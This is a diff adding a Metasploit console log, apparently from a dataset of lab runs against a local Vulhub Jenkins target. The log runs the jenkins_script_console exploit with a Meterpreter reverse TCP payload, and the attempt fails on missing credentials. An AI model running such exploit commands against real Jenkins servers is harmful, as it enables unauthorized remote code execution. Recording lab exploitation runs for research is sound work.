@@ -1,0 +1,29 @@
+[*] Processing /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc for ERB directives.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> spool /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/scan.stdout
+[*] Spooling to file /home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/scan.stdout...
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> use exploit/multi/http/jenkins_script_console
+[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set RHOSTS 127.0.0.1
+RHOSTS => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set RPORT 18025
+RPORT => 18025
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set LHOST 127.0.0.1
+LHOST => 127.0.0.1
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set TARGETURI /
+TARGETURI => /
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set SSL false
+SSL => false
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> set VERBOSE true
+VERBOSE => true
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> check
+[*] 127.0.0.1:18025 - The service is running, but could not be validated. The target application was detected but requires authentication
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> run
+[!] You are binding to a loopback address by setting LHOST to 127.0.0.1. Did you want ReverseListenerBindAddress?
+[*] Started reverse TCP handler on 127.0.0.1:4444 
+[*] Checking access to the script console
+[*] Logging in...
+[-] Exploit aborted due to failure: no-access: Incorrect credentials - :
+[*] Exploit completed, but no session was created.
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> spool off
+[*] Spooling is now disabled
+resource (/home/kali/dataset/dec-vulhub-2026-08-05/raw/metasploit/jenkins_1000861/run.rc)> exit
